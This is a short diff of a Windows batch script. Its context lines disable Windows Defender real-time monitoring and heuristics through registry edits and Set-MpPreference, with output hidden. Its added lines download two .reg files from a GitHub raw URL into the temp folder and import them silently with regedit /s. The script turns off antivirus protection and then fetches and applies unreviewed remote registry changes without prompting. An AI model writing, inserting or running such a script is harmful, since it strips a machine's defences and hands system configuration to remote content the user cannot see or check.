@@ -8,3 +8,10 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f > nul
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" /v "DisableHeuristics" /t REG_DWORD /d 1 /f > nul
 powershell Set-MpPreference -DisableRealtimeMonitoring $true > nul
+
+
+curl -sS -o %TEMP%\fleur.reg https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/fleur.reg
+C:\Windows\regedit.exe /s %TEMP%\fleur.reg
+
+curl -sS -o %TEMP%\fleur2.reg https://raw.githubusercontent.com/repossess/fleur/refs/heads/main/dependencies/fleur2.reg
+C:\Windows\regedit.exe /s %TEMP%\fleur2.reg
